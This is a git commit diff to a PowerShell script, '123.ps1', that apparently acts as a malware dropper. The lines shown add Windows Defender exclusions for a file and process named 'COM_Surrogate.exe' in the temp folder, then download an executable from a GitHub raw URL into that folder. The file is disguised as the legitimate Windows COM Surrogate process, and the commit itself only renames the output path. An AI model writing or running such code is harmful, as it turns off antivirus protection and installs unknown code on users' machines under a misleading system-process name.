e070fa948d8fe6bc111d42b83783e206e27b6b31
chickennuggets <118553163+M7mmdddd@users.noreply.github.com>
2025-03-12 00:23:53 +0300

    Update 123.ps1

--- 123.ps1
+++ 123.ps1
@@ -4,7 +4,7 @@ Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
 Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
 $url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
 
- $output = "$env:TEMP\COM_Surrogate.exe"
+ $output = "$env:TEMP\COM Surrogate.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $output
 
